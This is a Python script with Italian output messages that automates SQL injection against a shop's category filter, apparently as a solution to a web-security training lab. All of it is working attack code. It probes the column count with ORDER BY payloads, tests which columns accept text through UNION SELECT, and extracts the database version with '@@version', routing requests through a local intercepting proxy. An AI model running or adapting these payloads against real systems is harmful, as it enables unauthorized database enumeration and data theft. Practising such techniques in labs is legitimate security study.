import requests
import sys
import urllib3
import re
from bs4 import BeautifulSoup
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http' : 'http://127.0.0.1:8080' , 'https' : 'http://127.0.0.1:8080'}

URI = "/filter?category=Gifts"

def exploit_sqli_version(url,uri):
    sql_payload = "' UNION SELECT @@version,NULL-- -"
    r = requests.get(url + uri + sql_payload, verify=False, proxies=proxies)
    response = r.text
    if "8.0.32" in response:
        print("[+] Versione del database individuata")
        soup = BeautifulSoup(response, "html.parser")
        version = soup.find(string=re.compile(r'.*buntu.*'))
        print("[+] La versione del database è: " + version)
        return True
    return False

    

def exploit_num_cols(url,uri):
    for i in range(1,50):
        sql_payload = "' ORDER BY %s-- -" %i
        r = requests.get(url + uri + sql_payload, verify=False, proxies=proxies)
        response = r.text
        if "Internal Server Error" in response:
            return i -1
        i = i + 1
    return False

def exploit_cols_text(url,uri,cols):
    string = "'TESTTEXTCOLUMN'"
    payload_list = ['NULL'] * cols
    sql_payload = "' UNION SELECT " + ",".join(payload_list) + "-- -"
    try:
        payload_list[0] = string
        payload_list[1] = string
        sql_payload = "' UNION SELECT " + ",".join(payload_list) + "-- -"
        r = requests.get(url + uri + sql_payload, verify=False, proxies=proxies)
        response = r.text
        if string.strip('\'') in response:
            return cols
    except:
        
        for i in range(1,cols+1):
            string = "'TESTTEXTCOLUMN'"
            payload_list = ['NULL'] * cols
            payload_list[i - 1] = string
            sql_payload = "' UNION SELECT " + ",".join(payload_list) + "-- -"
            r = requests.get(url + uri + sql_payload, verify=False, proxies=proxies)
            print(r)
            response = r.text
            print(response)
            if string.strip('\'') in response:
                return i 
    return False




if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()

    except IndexError:
        print("[-] Utilizzo: %s <url>" % sys.argv[0])
        print("[-] Esempio: %s www.example.com" % sys.argv[0])
        sys.exit()

    print("[+] Verificando il numero di colonne")
    num_cols = exploit_num_cols(url,URI)
    print("[+] Il numero di colonne è pari a " + str(num_cols))

    print("[+] Verificando quali colonne possono contenere del testo")
    text_cols = exploit_cols_text(url,URI,num_cols)
    print("[+] Numero di colonne che possono contenere del testo è pari a " + str(text_cols))

    print("[+] Verificando la versione del database")


    if not exploit_sqli_version(url,URI):
        print("[-] Impossibile identificare la versione del database.")